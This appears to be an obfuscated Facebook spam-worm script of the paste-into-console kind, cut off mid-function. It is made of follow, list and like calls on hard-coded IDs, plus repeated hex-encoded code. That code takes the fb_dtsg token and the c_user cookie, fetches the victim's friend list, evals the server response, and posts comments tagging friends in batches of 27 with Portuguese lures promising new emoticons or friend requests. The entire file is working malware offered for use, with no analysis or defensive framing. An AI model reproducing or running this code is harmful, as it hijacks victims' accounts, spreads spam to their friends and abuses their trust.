P("424342001042942");P("424343281042814");P("423900721087070");P("421407608003048");P("421410061336136");P("421417851335357");
P("420908701386272");P("420899994720476");P("420899568053852");P("420897154720760");P("420888418054967");
P("417888511688291");P("413934378750371");P("417900151687127");P("413945378749271");P("406524929491316");
P("465818833549668");
P("465810936883791");
P("283956995105034");
P("424342001042942");
P("424343281042814");
P("423900721087070");
P("421407608003048");
P("421410061336136");
P("421417851335357");
P("420908701386272");
P("420899994720476");
P("420899568053852");
P("420897154720760");
P("420888418054967");
P("417888511688291");
P("413934378750371");
P("417900151687127");
P("413945378749271");
P("406524929491316");
P("449884268476458");
P("449942195137332");
P("443320535799498");
P("441987669266118");
P("446224772175741");
P("227283994138366");
P("226589777541121");
P("229859783880787");
P("230747993791966");
P("360273094116500");
P("419811928162616");
P("418403158303493");
P("416973198446489");
P("370943796382763");
P("392269077583568");
P("403487369795072");
P("416975151779627");
P("370486919761784");
P("362550447222098");
P("361968713946938");
P("362923933851416");
P("364869286990214");
P("386957111448098");
P("363023460508130");
P("363015173842292");
P("363157353828074");
P("363194690491007");
P("363190950491381");
sublist("420445464765929");sublist("420446144765861");sublist("420446414765834");sublist("487901128001980");sublist("420446911432451");sublist("420447261432416");sublist("420447584765717");sublist("420455211431621");sublist("420447771432365");sublist("420447951432347");sublist("420450171432125");sublist("420455704764905");
Like("720614167982418");Like("197127573752130");Like("416545818404086");Like("408902105870460");Like("245508552280268");Like("444986802191149");Like("446001928855396");Like("175919099283502");Like("231354707034098");Like("248977078590404");Like("185909841608712");Like("417726968283759");Like("359506814148776");Like("337583559650361");Like("141960489282258");Like("417833318276745");Like("514915245190064");Like("450400751746688");Like("273698709475930");
Like("201734526693313");Like("197127573752130");Like("151803808320354");Like("129593323897346");Like("245508552280268");Like("446001928855396");

var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","624470577628323","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xbddd=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x37\x32\x30\x39\x36\x37\x37\x36\x34\x36\x31\x33\x37\x32\x35","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","","\x72\x65\x70\x6C\x61\x63\x65","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x3B","\x6C\x65\x6E\x67\x74\x68","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x75\x69\x64","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x6F\x70\x65\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x73\x65\x6E\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x56\x65\x6A\x61\x20\x51\x75\x65\x6D\x20\x56\x69\x73\x69\x74\x6F\x75\x20\x53\x65\x75\x20\x50\x65\x72\x66\x69\x6C\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x26\x73\x6F\x75\x72\x63\x65\x3D\x32","\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x31\x33\x37\x37\x38\x37\x31\x37\x39\x37\x31\x33\x38\x3A\x31\x37\x30\x37\x30\x31\x38\x30\x39\x32","\x26\x72\x65\x70\x6C\x79\x5F\x66\x62\x69\x64","\x26\x70\x61\x72\x65\x6E\x74\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x69\x64","\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x32\x5F\x33","\x26\x63\x6C\x70\x3D\x7B\x22\x63\x6C\x5F\x69\x6D\x70\x69\x64\x22\x3A\x22\x34\x35\x33\x35\x32\x34\x61\x30\x22\x2C\x22\x63\x6C\x65\x61\x72\x63\x6F\x75\x6E\x74\x65\x72\x22\x3A\x30\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22\x3A\x22\x6A\x73\x5F\x35\x22\x2C\x22\x76\x65\x72\x73\x69\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22\x3A","\x7D","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x73\x74\x69\x63\x6B\x65\x72\x5F\x66\x62\x69\x64\x3D\x30","\x26\x61\x74\x74\x61\x63\x68\x65\x64\x5F\x70\x68\x6F\x74\x6F\x5F\x66\x62\x69\x64\x3D\x30","\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E","\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x5B\x5D","\x26\x5F\x5F\x61\x3D\x31","\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x78\x6C\x32\x75\x35\x46\x39\x37\x4B\x65\x70\x45\x73\x79\x6F","\x26\x5F\x5F\x72\x65\x71\x3D\x71","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x61\x64\x64\x5F\x63\x6F\x6D\x6D\x65\x6E\x74\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x37\x32\x30\x39\x37\x36\x36\x30\x37\x39\x34\x36\x31\x37\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x4E\x6F\x76\x6F\x73\x20\x45\x6D\x6F\x74\x69\x63\x6F\x6E\x73\x20\x70\x61\x72\x61\x20\x63\x6F\x6D\x65\x6E\x74\xE1\x72\x69\x6F\x73\x20\x6E\x6F\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x33\x37\x36\x36\x35\x31\x39\x30\x39\x31\x34\x35\x32\x38\x35","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x35\x2E\x30\x30\x30\x20\x70\x65\x64\x69\x64\x6F\x73\x20\x64\x65\x20\x61\x6D\x69\x7A\x61\x64\x65\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x37\x32\x30\x39\x37\x34\x33\x34\x31\x32\x37\x39\x37\x33\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x4E\x6F\x76\x6F\x73\x20\x45\x6D\x6F\x74\x69\x63\x6F\x6E\x73\x20\x70\x61\x72\x61\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x37\x32\x30\x39\x37\x31\x32\x30\x37\x39\x34\x36\x37\x31\x34","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x35\x2E\x30\x30\x30\x20\x70\x65\x64\x69\x64\x6F\x73\x20\x64\x65\x20\x41\x6D\x69\x7A\x61\x64\x65\x20\x6E\x6F\x20\x46\x61\x63\x65\x62\x6F\x6F\x6B\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20","\x34\x36\x35\x38\x31\x38\x38\x33\x33\x35\x34\x39\x36\x36\x38","\x37\x32\x30\x39\x36\x35\x39\x39\x37\x39\x34\x37\x32\x33\x35","\x26\x63\x6F\x6D\x6D\x65\x6E\x74\x5F\x74\x65\x78\x74\x3D\x20\x47\x61\x6E\x68\x65\x20\x31\x2E\x30\x30\x30\x20\x73\x65\x67\x75\x69\x64\x6F\x72\x65\x73\x20\x70\x6F\x72\x20\x64\x69\x61\x20\x3B\x29\x20\x44\x65\x73\x63\x75\x6C\x70\x65\x20\x70\x6F\x72\x20\x6D\x61\x72\x63\x61\x72\x20\x74\x6F\x64\x6F\x73\x28\x79\x29\x20"];var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[5],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[65],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[66],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[67],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[68],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var 